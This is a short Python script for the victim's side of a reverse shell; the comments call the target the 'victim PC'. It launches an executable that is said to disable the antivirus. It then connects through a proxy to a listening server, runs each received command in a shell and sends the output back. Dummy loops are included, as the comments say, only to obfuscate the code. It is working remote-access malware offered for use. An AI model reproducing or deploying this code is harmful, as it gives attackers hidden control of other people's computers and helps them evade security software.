#This script run in the victim PC
import socket
import os
import subprocess
import socks

#Set the IP and the port of the listening server
target_host = "127.0.0.1" 
target_port = 443
#This variable and the cycle for present in the code are unnecessary, are used only to obfuscate the code
socketON = 0
connectON = 0
closeON = 0

subprocess.call("antivirus.exe") #we launch the exe file that shut down the antivirus.

for n in range(100):
    if socketON == 0:
        #client = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #If there is not a proxy uncomment this part. 
        client = socks.socksocket(socket.AF_INET,socket.SOCK_STREAM) #if there is a proxy server, must be configured.
        client.set_proxy(socks.HTTP, "localhost", 3128)
        print("Socket created")
        socketON = 1

for n in range(100):
    if connectON == 0:
        client.connect((target_host,target_port))
        print("Connection established")
        connectON = 1
#We receive the command in data object decode it to string and check if it is equal to “cd”, We do this to check cd command executed correctly because cd command doesn’t have an output to send us back. To change directory we use os.chdir. 
#For the other commands we directly open a process and give the decoded string, SHELL should be FALSE if you don’t want a shell to open on client’s machine, we are piping out the stdout, stderr and stdin. We read the piped bytes into output_bytes, convert it to string and send it across the connection along with current working directory(cwd) using client.send(). we close the connection when while loop breaks.
while True:
    for n in range(1000):
        data = client.recv(1024).decode("utf-8")
        break
    if data[:2] == 'cd':
        for n in range(1000):
            os.chdir(data[3:])
            break
    if len(data) > 0:
        for n in range(1000):
            cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
            output_bytes = cmd.stdout.read()
            output_str = str(output_bytes, "utf-8")
            client.send(str.encode(output_str + str(os.getcwd()) + '$'))
            break
        #print(output_str)  

for n in range(100):
    if closeON == 0:
        client.close()
        closeON = 1
    break